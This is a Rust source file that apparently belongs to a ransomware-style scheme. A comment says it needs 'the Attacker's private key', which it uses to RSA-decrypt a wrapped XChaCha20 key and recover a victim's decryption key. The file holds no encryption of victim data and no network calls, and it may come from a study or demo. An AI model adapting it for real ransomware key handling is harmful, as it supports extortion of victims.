use std::fs;
use std::fs::File;
use std::io::Read;
use chacha20poly1305::{XChaCha20Poly1305, KeyInit, aead::Aead};
use rsa::{RsaPrivateKey, Oaep};

use rsa::pkcs8::{DecodePrivateKey};
use anyhow::anyhow;


fn main() {
    // Needs the Attacker's private key
    let private_key = fs::read_to_string("priv.key").expect("Cannot read first key part");
    let private_key = RsaPrivateKey::from_pkcs8_pem(private_key.as_str()).unwrap();
    let enc = fs::read("key.part1").unwrap();

    let padding = Oaep::new::<sha2::Sha256>();
    let key = private_key.decrypt(padding, enc.as_slice()).expect("failed to decrypt");
    let key = key.as_slice().try_into().expect("Wrong key size");

    let mut nonce = [0u8; 24];
    let mut file = File::open("key.part2").expect("Cannot read second key part");

    file.read_exact(&mut nonce).expect("Cannot read nonce");

    let mut vec = Vec::new();
    file.read_to_end(&mut vec).expect("Cannot read encrypted data");

    let dec = decrypt_bytes(vec.as_slice(), key).expect("Cannot decrypt message");
    println!("Decryption bytes - {:?}", &key);
    fs::write("decryption.key", &key).expect("Cannot write decryption key");
    println!("{:?}", String::from_utf8(dec).expect("Malformed string was decrypted"));
}

fn encrypt_bytes(data: &[u8], key: &[u8; 32], nonce: &[u8; 24]) -> Result<Vec<u8>, anyhow::Error> {
    let cipher = XChaCha20Poly1305::new(key.into());

    let mut encrypted = cipher
        .encrypt(nonce.into(), data)
        .map_err(|err| anyhow!("Encrypting bytes: {}", err))?;
    let mut v = Vec::from(nonce.as_slice());
    v.append(&mut encrypted);
    Ok(v)
}

fn decrypt_bytes(data: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, anyhow::Error> {
    let cipher = XChaCha20Poly1305::new(key.into());

    let dec = cipher
        .decrypt(data[0..24].into(), data[24..].as_ref())
        .map_err(|err| anyhow!("Decrypting bytes: {}", err))?;
    Ok(dec)
}